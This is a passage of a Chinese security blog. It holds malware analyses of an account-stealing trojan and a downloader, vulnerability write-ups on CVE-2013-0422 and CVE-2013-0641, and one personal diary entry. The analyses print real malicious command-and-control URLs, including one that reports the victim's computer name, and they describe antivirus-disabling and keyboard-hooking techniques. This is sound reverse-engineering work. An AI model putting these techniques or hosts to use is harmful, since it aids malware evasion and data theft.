    <span class="number">0x1D0</span>：next ObjPtr <span class="comment">//存放着下一个对象的指针</span>
)
</code></pre><p>3.将创建的9个对象生成单向链表结构，并初始化。然后将相关信息填写到对象Object中。</p>
<pre><code>Object (
    <span class="number">0x00</span>：<span class="number">0x100061fc</span>  <span class="comment">//指向一些函数导出表</span>
    <span class="number">0x04</span>：<span class="number">0x003D38D8</span> <span class="comment">//0x13f8大小的对象指针</span>
    <span class="number">0x08</span>：<span class="number">1</span>   <span class="comment">//标志位，初始为0，特征值查找完以后置1</span>
    ......
    <span class="number">0x30</span>：<span class="number">0x10006244</span>  <span class="comment">//指向删除对象函数指针</span>
    <span class="number">0x34</span>：<span class="number">0x003D4CE8</span>  <span class="comment">//第一个对象指针</span>
    <span class="number">0x38</span>：<span class="number">0x003D5C68</span>  <span class="comment">//最后一个对象指针</span>
    <span class="number">0x3c</span>：nextPtr       <span class="comment">//存放下一个操作的对象指针，操作完成置0</span>
)
</code></pre><p>4.创建线程0x10003481<br>4.1 解密出URL：<a href="http://www.y0uku1.com/cia/bike.asp，方法同线程0x100021d9" target="_blank" rel="external">http://www.y0uku1.com/cia/bike.asp，方法同线程0x100021d9</a><br>4.2 生成新的URL：<a href="http://www.y0uku1.com/cia/mb.asp" target="_blank" rel="external">http://www.y0uku1.com/cia/mb.asp</a><br>4.3 通过函数GetComputerNameA得到计算机名字<br>4.4 按照格式”?A=%s&amp;c=%s&amp;u=%s”生成新的URL <a href="http://www.y0uku1.com/cia/mb.asp?A=putip&amp;c=TEST-D43880C7BB&amp;u=" target="_blank" rel="external">http://www.y0uku1.com/cia/mb.asp?A=putip&amp;c=TEST-D43880C7BB&amp;u=</a><br>4.5 从URL中读取数据，过程同线程0x100021d9中的0x3<br>4.6 延时10秒退出。</p>
<p>5.在当前进程中查找特征值<br>5.1 通过IsbadReadPtr函数判断进程基址开始的0x1000字节是否具有访问权限。<br>5.2 如果具有访问权将0x1000字节的数据读到内存中，然后与特征值匹配，如果找到特征值，则返回偏移量，之后加上基址得到绝对地址。<br>5.3 如果查找不到特征值则继续从进程中拷贝数据，每次0x1000字节，知道将当前进程搜索完。</p>
<p>6.设置Hook函数, 记录键盘数据发送的指定的链接地址。<br>该处举例子说明，如果在当前进程0x400004出找到了特征值，则将该处改为jmp 3F0000，在3F0000处代码为jmp 100037E8，这样当游戏进程启动时就会跳转到dll里边执行相应的操作，执行完之后再跳回去。如下图所示：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-steal-s1-3.png" alt=""></p>
<h4 id="线程0x100021d9功能：解密url，下载数据">线程0x100021d9功能：解密url，下载数据</h4><p>1.解密URL<br>1.1 读取91C7DF6D.dll文件中数据，去掉\r\n<br>1.2 DB2C93C09AD60F3BC9A2C35EDF1D148220000002200000072F18A7B04B578B3FCDA357BEAB38D0A2BAB9D6453B534ADEA82796BB1A3C81E69F572F18A7B04B578B3FCDA357BEAB38D0A2BAB9D6453B534ADEA82796BB1A3C81E69F5<br>1.3 将偏移0x18处开始的0x22个的数据分别与前0x10字节的数据相异或，再与0x37相异或得到解密的URL地址为<a href="http://www.y0uku1.com/cia/bike.asp" target="_blank" rel="external">http://www.y0uku1.com/cia/bike.asp</a></p>
<p>2.生成最终URL<br>2.1 获取cfg文件的前六个字节数据2DB2C9进行MD5加密，得到长度为0x10，然后再按照”%02X”格式生成0x20大小的数据18CE4D37773396E1332CCEAD3196AF50<br>2.2 最后按照一定的格式生成最终的URL链接：<br><a href="http://www.y0uku1.com/cia/bike.asp?Re=&amp;s=&amp;A=&amp;P=&amp;MB=&amp;wwwww=v&amp;H=&amp;PIN=&amp;R=&amp;RG=-1&amp;M=-1&amp;M1=-1&amp;mac=&amp;RG1=-1&amp;Z=:18CE4D37773396E1332CCEAD3196AF50" target="_blank" rel="external">http://www.y0uku1.com/cia/bike.asp?Re=&amp;s=&amp;A=&amp;P=&amp;MB=&amp;wwwww=v&amp;H=&amp;PIN=&amp;R=&amp;RG=-1&amp;M=-1&amp;M1=-1&amp;mac=&amp;RG1=-1&amp;Z=:18CE4D37773396E1332CCEAD3196AF50</a></p>
<p>3.访问链接下载数据<br>3.1 加载wininet.dll找到InternetOpenUrl函数地址<br>3.2 打开本地目录C:\Windows\System32\下的wininet.dll文件，然后从偏移0x14E5A处读取0x10字节数据，判断是否与得到的InternetOpenUrl函数地址不相同，则将InternetOpenUrl函数地址写入该处，之后调用InternetOpenUrl函数打开链接<a href="http://www.y0uku1.com/cia/mb.asp?A=putip&amp;c=TEST-D43880C7BB&amp;u=" target="_blank" rel="external">http://www.y0uku1.com/cia/mb.asp?A=putip&amp;c=TEST-D43880C7BB&amp;u=</a><br>下载数据，大小为0x104字节。<br>3.3 延时2分钟，然后循环下载数据。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2013/11/20/virus-troj-simple/" data-id="civbwoo5q000d5p6i6820853k" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2013/11/20/virus-troj-simple/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/盗号/">盗号</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-virus-download" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2013/11/18/virus-download/" class="article-date">
  <time datetime="2013-11-18T03:11:11.000Z" itemprop="datePublished">2013-11-18</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/virus/">virus</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/11/18/virus-download/">病毒分析-简单下载者</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>一个简单的下载者病毒简略分析</p>
<h2 id="调试环境">调试环境</h2><p>Windows xp sp3，Olldbg，010editor</p>
<h2 id="病毒简介">病毒简介</h2><p>病毒运行之后会从恶意网站中下载配置文件，并从配置文件中读取更多的链接下载恶意程序并将其运行，过程中会隐藏系统保护文件窗口，修改系统时间使卡巴斯基失效。</p>
<h2 id="运行过程">运行过程</h2><h3 id="查找伪装进程并将其启动">查找伪装进程并将其启动</h3><p>病毒如果伪装成conime.exe，ctfmon.exe，explorer.exe中任何一个进程运行，则从C:\WINDOWS\system32\dllcache找到该进程并启动。</p>
<pre><code>1.其中conime.exe，ctfmon.exe为输入法相关进程，explorer.exe为桌面进程，C:<span class="command">\WINDOWS</span><span class="command">\system</span>32<span class="command">\dllcache</span>为一个备用的重要系统文件库，里边存放着大部分动态链接库.dll和可执行文件.exe，如果C:<span class="command">\WINDOWS</span><span class="command">\system</span>32目录下的文件丢失，则系统自动从dllcache文件库中恢复过去。
2.如果病毒伪装成explorer.exe并覆盖掉C:<span class="command">\WINDOWS</span>目录下系统本身的explorer.exe，则会随着系统自动启动，取而代之的是桌面无法启动，因此从dllcache目录下找到explorer.exe并启动它。同理如果病毒覆盖掉C:<span class="command">\WINDOWS</span><span class="command">\system</span>32目录下的conime.exe，ctfmon.exe以后，当系统调用该进程时，为了保证程序功能正常使用而不被用户察觉到，就需要从dllcache文件下启动相应的进程。
</code></pre><h3 id="隐藏windows文件保护窗口">隐藏windows文件保护窗口</h3><p>病毒创建线程，该线程每隔50ms检测一下是否存在”windows文件保护”窗口，如下图所示，如有存在就将其隐藏。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-downloader-1.png" alt=""><br>当系统重要文件被删除或者替换以后，系统就会弹出windows文件保护窗口，因此病毒需要将该窗口隐藏。</p>
<h3 id="生成临时文件，判断病毒是否已经执行">生成临时文件，判断病毒是否已经执行</h3><p>1.获取系统临时文件路径C:\DOCUME~1\Admin\LOCALS~1\Temp\<br>判断C:\DOCUME~1\Admin\LOCALS~1\Temp~wupcai文件是否存在。<br>2.若该文件不存在则创建并写入8个字节99999999（大约167分钟）。<br>3.若该文件存在则获取系统启动后运行时间与该文件前8个字节进行比较，如果启动时间大于167分钟则标明该病毒已经运行不再继续执行，并将该启动时间写入~wupcai文件中。如果启动时间小于167分，则将启动时间写入~wupcai文件中并继续执行。</p>
<h3 id="验证文件完整性，读取加密的url地址">验证文件完整性，读取加密的url地址</h3><p>首先对病毒文件的完整性进行检测<br>1读取病毒文件偏移0x3F0处进行判断，该处存放着文件的大小，如果不为0则继续。<br>2读取文件偏移0x23FC处数据，判断是否为0xFFFEFDFC，如果是则继续。<br>3读取偏移0x23F8处数据与病毒文件大小作比较，如果小于则继续。<br>最后从文件偏移0x2370处读取0x88个字节数据，这些数据为加密过的url地址。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-downloader-2.png" alt=""></p>
<h3 id="解密url地址，下载配置文件">解密url地址，下载配置文件</h3><p>1.首先对加密过的url进行解密，解密方式为：将0x88个数据依次循环右移（N,R,D,G,B,N）次，6个字节为一个循环。<br>2.解密出url地址为：DLPY<a href="http://new.749571.com/new.txt，并对url头DLPY进行验证并下载文件new.txt" target="_blank" rel="external">http://new.749571.com/new.txt，并对url头DLPY进行验证并下载文件new.txt</a>.<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-downloader-3.png" alt=""></p>
<h3 id="针对卡巴斯基的免杀">针对卡巴斯基的免杀</h3><p>查找卡巴斯基进程avp.exe，如果找到，将系统时间改为2001年11月1日<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-downloader-4.png" alt=""><br>卡巴斯基要想正常运行，首先要对用户的key文件进行校验，看是否过期。<br>卡巴斯基校验key的合法性是通过本地时间来校验，系统时间一旦被病毒修改为非授权时间，key文件立即失效，从而导致卡巴斯基无法升级无法正常使用。</p>
<h3 id="生成病毒文件并执行">生成病毒文件并执行</h3><p>在系统临时文件目录下边创建tmp<em>.tmp文件，从new.txt文件oo字段读取e0~e49个链接分别将数据下载到tmp</em>.tmp文件中并执行，总共执行0x32个tmp文件。</p>
<h3 id="检测运行环境">检测运行环境</h3><p>查找卡巴斯基进程avp.exe，如果存在，修改系统时间使其失效。查看是否存在”windows系统保护窗口”，如果存在，将其隐藏。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2013/11/18/virus-download/" data-id="civbwoo6y001f5p6ilck7bzwd" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2013/11/18/virus-download/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/下载/">下载</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-exploit-cve-2013-0422" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2013/07/01/exploit-cve-2013-0422/" class="article-date">
  <time datetime="2013-07-01T13:52:36.000Z" itemprop="datePublished">2013-07-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/exploit/">exploit</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/07/01/exploit-cve-2013-0422/">CVE-2013-0422</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>CVE-2013-0422漏洞简略分析</p>
<h2 id="简介">简介</h2><p>此漏洞属于JAVA7的设计缺陷，该漏洞主要利用了MBeanInstantiator类中FindClass函数能够查找到任何包内任何类的对象的功能,使得Applet获得了本来无权访问的类;<br>然后又利用了在JDK1.7中新增的动态实现细节中MethodHandles.Lookup类中findConstructor及findVirtual函数创建了Classloader,并加载了恶意类.</p>
<h2 id="调试环境">调试环境</h2><p>本机：Eclipse；win7 x64；jre-7u5-windows-i586；Metasploit 4.6<br>虚拟机：win xp sp3；jre-7u5-windows-i586；IE8</p>
<h2 id="Metasploit测试">Metasploit测试</h2><p>1.首先在Metasploit里边做下漏洞利用测试,配置环境如下所示：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/java-cve-2013-0422-1.png" alt=""></p>
<p>2.之后在虚拟机中IE8输入上边的URL地址之后在Metasploit内就可以得到shell窗口了。<br>地址：<a href="http://192.168.237.1:8080/SIBwjkLzdI" target="_blank" rel="external">http://192.168.237.1:8080/SIBwjkLzdI</a><br><img src="http://o9xrwsn0z.bkt.clouddn.com/java-cve-2013-0422-2.jpg" alt=""></p>
<h2 id="测试代码">测试代码</h2><p>首先看下正常情况下的本地测试，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;   </span><br><span class="line"><span class="keyword">import</span> java.security.Permission;  </span><br><span class="line"><span class="keyword">import</span> java.security.PermissionCollection;  </span><br><span class="line"><span class="keyword">import</span> java.security.Policy;  </span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;  </span><br><span class="line"><span class="keyword">import</span> java.util.Enumeration;  </span><br><span class="line"><span class="keyword">import</span> javax.swing.JOptionPane;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">checkPermission</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">        ProtectionDomain domain = <span class="keyword">this</span>.getClass().getProtectionDomain();  </span><br><span class="line">        PermissionCollection pcoll = Policy.getPolicy().getPermissions(domain);  </span><br><span class="line">        Enumeration e = pcoll.elements();  </span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;  </span><br><span class="line">        <span class="keyword">for</span> (; e.hasMoreElements();) &#123;  </span><br><span class="line">            Permission p = (Permission) e.nextElement();  </span><br><span class="line">            System.out.println(i + <span class="string">": "</span> + p);  </span><br><span class="line">            i++;  </span><br><span class="line">        &#125;  </span><br><span class="line">        System.out.println(<span class="string">"the num:"</span> + i); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">alert</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block  </span></span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">            <span class="keyword">throw</span> e;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub  </span></span><br><span class="line">            Test test = <span class="keyword">new</span> Test();</span><br><span class="line">             <span class="comment">// test.checkPermission(); </span></span><br><span class="line">            System.out.println(<span class="string">"1.SecurityManager 开启前测试"</span>);  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                test.alert();  </span><br><span class="line">                System.out.println(<span class="string">"2.成功执行 exec"</span>);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (SecurityException e) &#123;  </span><br><span class="line">                System.out.println(<span class="string">"2.you have no permission to exec"</span>);  </span><br><span class="line">            &#125;  </span><br><span class="line">            System.out.println(<span class="string">"3.开启SecurityManager"</span>);  </span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> SecurityManager());  </span><br><span class="line">            System.out.println(<span class="string">"4.SecurityManager 开启后测试"</span>);  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                test.alert();  </span><br><span class="line">                System.out.println(<span class="string">"5.成功执行 exec"</span>);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (SecurityException e) &#123;  </span><br><span class="line">                System.out.println(<span class="string">"5.you have no permission to exec"</span>);  </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Throwable e1) &#123;  </span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block  </span></span><br><span class="line">            e1.printStackTrace();  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果：<br>1.SecurityManager 开启前测试<br>2.成功执行 exec  //弹出计算器<br>3.开启SecurityManager<br>4.SecurityManager 开启后测试<br>5.you have no permission to exec<br>可见，在开启SecurityManager的情况下是不具有执行exec权限的。</p>
<h2 id="关键代码分析">关键代码分析</h2><p>该漏洞关键代码如下：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/java-cve-2013-0422-3.png" alt=""></p>
<p>1.<br><img src="http://o9xrwsn0z.bkt.clouddn.com/java-cve-2013-0422-4.png" alt=""><br>由于MBeanInstantiator.findClass函数能够获得任意包中的任意类,因此其继承类<br>localMBeanInstantiator能够访问原本无权访问的sun.org.mozilla.javascript.internal.Context 及<br>sun.org.mozilla.javascript.internal.GeneratedClassLoader类;<br>其中，localClass1 及localClass2分别是两个类的引用.</p>
<p>2.<br><img src="http://o9xrwsn0z.bkt.clouddn.com/java-cve-2013-0422-5.jpg" alt=""><br>根据Java7中MethodHandles的动态调用功能, MethodHandles.Lookup 类中包含findVirtual(), findConstructor(), findStatic() , findSpecial() 四个函数。第 三 行localLookup.findVirtual 函 数返回了MethodHandles.Lookup类的findConstructor 函数，指其定类型为localMethodHandle1;之后指定locaMethodType2 的类型为Void型。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/java-cve-2013-0422-6.jpg" alt=""><br>由于localMethodHandle1为MethodHandles.Lookup的findConstructor函数句柄,localClass1 为MBean中已经加载的sun.org.mozilla.javascript.internal.Context对象的引用,故调用invokeWithArguments函数即为在JVM中寻找sun.org.mozilla.javascript.internal.Context类的构造函数,返回该类构造函数的句柄为localMethodHandle2, 于是接下来的调用localMethodHandle2.invokeWithArguments即是创建sun.org.mozilla.javascript.internal.Context类的实例对象localObject1.至此通过<br>MBeanInstantiator类与MethodHandles类,实现了在Applet类中访问原本无权访问<br>的sun.org.mozilla.javascript.internal.Context类的目的.</p>
<p>3.<br><img src="http://o9xrwsn0z.bkt.clouddn.com/java-cve-2013-0422-7.jpg" alt=""><br>方法与上面2相同,localMethodHandle3为MethodHandles.Lookup类findVirutal()函数句柄，类型为localMethodType3。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/java-cve-2013-0422-8.jpg" alt=""><br>通过findVirtual函数得到sun.org.mozilla.javascript.internal.Context类的createClassLoader函数,localMethodHandle4即为createClassLoader句柄;<br><img src="http://o9xrwsn0z.bkt.clouddn.com/java-cve-2013-0422-9.jpg" alt=""><br>通过调用localObject1的createClassLoader函数创建了一个新的classLoader. localObject2为ClassLoader的实例.<br><img src="http://o9xrwsn0z.bkt.clouddn.com/java-cve-2013-0422-10.jpg" alt=""><br>通过MethodHandles.Lookup函数的findVirtual()查找到sun.org.mozilla.javascript.internal.GeneratedClassLoader类的defineClass函数,函数类<br>型由localMethodType5 指定.此时localMethodHandle5 为defineClass函数类型.<br><img src="http://o9xrwsn0z.bkt.clouddn.com/java-cve-2013-0422-11.jpg" alt=""><br>通过调用localObject2类的defineClass函数将arrayOfByteBuff加载到JVM中,并创建为对象<br>localClass3,此时localClass3具有与localObject2相同的系统权限.</p>
<p>4.当执行localClass3.newInstance 时,在其实现中去掉了系统的SecurityManager,到此完<br>全关闭了系统的安全策略,从而实现了exploit.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2013/07/01/exploit-cve-2013-0422/" data-id="civbwooae004b5p6itf3i6og5" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2013/07/01/exploit-cve-2013-0422/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/">cve</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-diary-2013-05-01" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2013/05/01/diary-2013-05-01/" class="article-date">
  <time datetime="2013-04-30T17:01:11.000Z" itemprop="datePublished">2013-05-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/diary/">diary</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/05/01/diary-2013-05-01/">回家</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>&#160; &#160; &#160; &#160;今天晚上刚到家，家里一切安好，顿时心情很好，很踏实我总会有这种感觉，每离开一个地方时间久了都会觉得只是做了一个梦，感觉只会是这样，我去过那里吗？北京亦如此，只有家的感觉最真实，再见，陪伴我将近一年的地方。</p>
<p>&#160; &#160; &#160; &#160;前几天看了电影《砰然心动》，当最后音乐响起的时候，勾起了无数的回忆在年轻的时候，在那些充满了阳光的长长的下午，我无所事事，也无所怕惧只因为我知道，在我的生命里，会有一种永远的等待。很喜欢这样的感觉两人相视而坐，对方的一切都可以尽收眼里，因为你的淡漠表情而轻索眉头的动作，因为你刘海下垂而清抖发丝的素手动作，因为你说话激动而嘴角嘟起来的可爱摸样，这样清新而自然的神情动作，都被我默默的看在眼里，心里顿生温暖安详之感。</p>
<p>&#160; &#160; &#160; &#160;有些温暖心窝的话语，总是时不时地来招惹泪水，让我感动的说不出话来你看，这么多人希望你幸福快乐，所以你会幸福快乐的，我知道幸福对于每个人有不同的定义。我向往那种平静的幸福在慵懒的午后，我们一块在阳台上喝咖啡细诉畅谈或者是傍晚行走在公园，找几个朋友一块，看看过往的行人，讨论他们在想什么，亦或者是早上一杯酸奶鸡蛋，中午一杯开水一本书，晚上一杯咖啡一首歌，便是幸福的了。</p>
<p>&#160; &#160; &#160; &#160;此时，我们一家人坐在一起，妈妈姐姐在说话，爸爸拿着我的pad噼里啪啦的玩捕鱼达人，我一边插话一边轻轻地敲打着键盘，内心平静幸福，一家人的客厅，暖色调的装潢，温暖四溢，楼下有几对情侣在窃窃私语，相互在逗乐着，脸上洋溢着叫幸福的表情，桌上的大桶雪碧被我喝掉三分之二了，我慵懒地靠在沙发上闭上眼睛，空气中弥漫着淡淡茉莉花茶的清香，思绪泛滥。</p>
<p>&#160; &#160; &#160; &#160;你问我为什么活着，我说我不知道，不知什么时候开始我不喜欢去思考这样的问题，工作之外我会把脑子放空去把一些事情思考的简单，或许在不久的将来旁边的你穿着宽松的睡衣，乱乱的头发，靠在我肩上看电视我安静听着你叨叨的琐事，回想着曾经年少的时候谁陪我走过的操场和追过的公交车，那时你再问我为什么活着我会说，为这一刻。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2013/05/01/diary-2013-05-01/" data-id="civbwoodi005n5p6iiooze48a" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2013/05/01/diary-2013-05-01/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/无法描述/">无法描述</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-exploit-cve-2013-0641" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2013/03/21/exploit-cve-2013-0641/" class="article-date">
  <time datetime="2013-03-21T02:08:11.000Z" itemprop="datePublished">2013-03-21</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/exploit/">exploit</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/03/21/exploit-cve-2013-0641/">CVE-2013-0641</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>CVE-2013-0641 Acrobat Reader sandbox escape 调试笔记</p>
<h2 id="调试环境：">调试环境：</h2><p>Windows xp sp3_en &amp; Adobe Reader 11.0.1 &amp; Windbg &amp; IDA</p>
<h2 id="漏洞简介">漏洞简介</h2><p>Acrobat Reader自从引入沙盒功能以来，针对其的漏洞攻击就急剧减少，表明沙盒对攻击门槛的提高帮助不少。门槛提升不代表无法攻击，最近流传的通过spear phishing邮件发送pdf附件的攻击就是利用了2个漏洞，第一个利用xfa漏洞rop shellcode加载恶意dll后，再次利用沙盒漏洞，在broker process进程执行最终的恶意代码。</p>
<h2 id="沙箱逃离流程">沙箱逃离流程</h2><p>整个逃离过程全是在D.T dll中完成，该DLL由sandbox process触发xfa漏洞之后shellcode加载,流程如下图所示：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-1.jpg" alt=""></p>
<p>1.通过函数RegisterClipboardFormatW注册剪切板格式，构造0×80个dword，dword全为0×8080020。</p>
<p>2.触发broker process进程分配大小0xC800000内存，其中布置好rop shellcode，同时站位0×8080020附近范围的内存。</p>
<p>3.D.T构造调用GetClipboardFormatNameA的lpc buffer，同时更改lpc buffer对应要调用的tag变成0×73，0×73为GetClipboardFormatNameW的调用tag，broker process进程调用GetClipboardFormatNameW函数获取format，由于原本GetClipboardFormatNameW参数buffer里面填充了0×9c大小的0×42，且是单字节，但是实际的拷贝长度为0×9c×2，导致覆盖了后面的函数指针。</p>
<p>4.D.T构造tag id 0xb0的调用，最终在acrod32.exe 地址AcroRd32+0×9afda控制EIP，跳至0×808002c处执行已经布置好的shellcode， 该shellcode加载L2P.T dll后完成此次攻击。</p>
<h2 id="调试过程">调试过程</h2><h3 id="Step1:_注册ClipboardFormat">Step1: 注册ClipboardFormat</h3><p>breakpoit</p>
<pre><code>sandbox process: 
<span class="number">0</span> e <span class="number">089</span>c1d7c     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** D+<span class="number">0x1d7c</span>
</code></pre><p>D.T通过user32!RegisterClipboardFormatW注册了一个clipboard format，format中构造数据为0x80个0x08080020（该地址为触发漏洞是指向的函数指针地址)。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2013-0641-2.jpg" alt=""></p>
<p>因此注册新clipboard format的名称为0x80个0x08080020大小为200h，存放在lpszFormat中注册成功，返回表示注册的剪切板格式：0x0000c10a</p>
<pre><code>RegisterClipboardFormat功能
注册一个新的剪贴板格式。这种格式可以被用来作为一个有效的剪贴板格式。
参数
lpszFormat <span class="string">[]</span>
类型：LPCTSTR    新的格式的名称
返回值类型：UINT
如果函数调用成功，则返回值标识已注册的剪贴板格式。
如果函数失败，返回值是零。
</code></pre><h3 id="Step2:_构造ROP链，完成堆喷射">Step2: 构造ROP链，完成堆喷射</h3><p>breakpoit</p>
<pre><code>sandbox process:
<span class="number">1</span> e <span class="number">089</span>c227d     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** D+<span class="number">0x227d</span>  <span class="comment">/////加载clbcatq.dll函数</span>
<span class="number">2</span> e <span class="number">089</span>c2978     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** D!initOLEcontainer+<span class="number">0x5ec</span>  <span class="comment">/////load("clbcatq.dll")</span>
<span class="number">3</span> e <span class="number">089</span>c2a75     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** D!initOLEcontainer+<span class="number">0x6e9</span>  <span class="comment">/////构造rop</span>
<span class="number">4</span> e <span class="number">089</span>c2b87     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** D!initOLEcontainer+<span class="number">0x7fb</span>  <span class="comment">////拷贝木马路径到共享内存30830408</span>
<span class="number">5</span> e <span class="number">089</span>c2ba4     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** D!initOLEcontainer+<span class="number">0x818</span>  <span class="comment">///拷贝ROP 堆喷</span>
</code></pre><p>ClipboardFormat注册过后返回到D+0x2266</p>
<pre><code><span class="number">089</span>c2266 <span class="number">89</span>c3            mov     ebx,eax
<span class="number">089</span>c2268 <span class="number">680000800</span>c      push    offset &lt;Unloaded_ow.api&gt;+<span class="number">0xc7fffef</span> (<span class="number">0</span>c800000)
<span class="number">089</span>c226d e85e090000      call    D!initOLEcontainer+<span class="number">0x844</span> (<span class="number">089</span>c2bd0)
<span class="number">089</span>c2272 <span class="number">89</span>c6            mov     esi,eax
<span class="number">089</span>c2274 <span class="number">85f</span>6            test    esi,esi
